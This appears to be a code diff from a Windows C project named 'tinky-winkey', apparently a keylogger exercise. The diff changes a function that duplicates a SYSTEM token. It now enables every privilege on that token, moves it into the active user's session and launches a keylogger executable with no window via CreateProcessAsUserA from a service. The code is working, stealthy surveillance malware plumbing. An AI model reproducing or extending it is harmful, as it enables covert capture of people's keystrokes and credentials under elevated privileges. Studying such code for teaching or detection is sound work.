@@ -175,7 +175,7 @@ BOOL EnableAllPrivilege(HANDLE currentToken)
     return TRUE;
 }
 
-void ImpersonateSystemToken(void)
+VOID ImpersonateSystemToken(LPPROCESS_INFORMATION keylogInfo)
 {
     HANDLE sysToken = NULL;
     HANDLE procHandle = NULL;
@@ -210,19 +210,35 @@ void ImpersonateSystemToken(void)
         printf("Could not duplicate the process token.\n");
         exit(PrintError());
     }
-    success = SetThreadToken((PHANDLE)NULL, newSysTok);
-    if (!success)
+    STARTUPINFO sa = {0};
+    DWORD activesessionId = GetActiveSessionId();
+    if (activesessionId == 0)
     {
-        printf("Failed to set the current thread's token.\n");
-        exit(PrintError());
+        log("GetActiveSessionId failed.\n");
+        ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
+        exit(1);
     }
-    PrintUserNameByThread();
-    printf("\n=== Privileges for the thread after impersonation ===\n\n");
-    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, TRUE, &currentToken))
+    EnableAllPrivilege(newSysTok);
+    SetTokenInformation(newSysTok, TokenSessionId, &activesessionId, sizeof(activesessionId));
+    BOOL res =  CreateProcessAsUserA(newSysTok, "C:\\Users\\Administrateur\\Documents\\tinky-winkey\\winkey.exe", NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW, NULL, NULL, &sa, keylogInfo);
+    if (res == FALSE)
     {
-        printf("OpenThreadToken failed.\n");
-        exit(PrintError());
+        PrintError();
+        log("CreateProcessAsUserA failed.\n");
+        ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
+        exit(1);
     }
-    EnableAllPrivilege(currentToken);
-    PrintPrivileges(GetCurrentThreadToken()); 
+    // if (!success)
+    // {
+    //     printf("Failed to set the current thread's token.\n");
+    //     exit(PrintError());
+    // }
+    // PrintUserNameByThread();
+    // printf("\n=== Privileges for the thread after impersonation ===\n\n");
+    // if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, TRUE, &currentToken))
+    // {
+    //     printf("OpenThreadToken failed.\n");
+    //     exit(PrintError());
+    // }
+    // PrintPrivileges(GetCurrentThreadToken()); 
 }
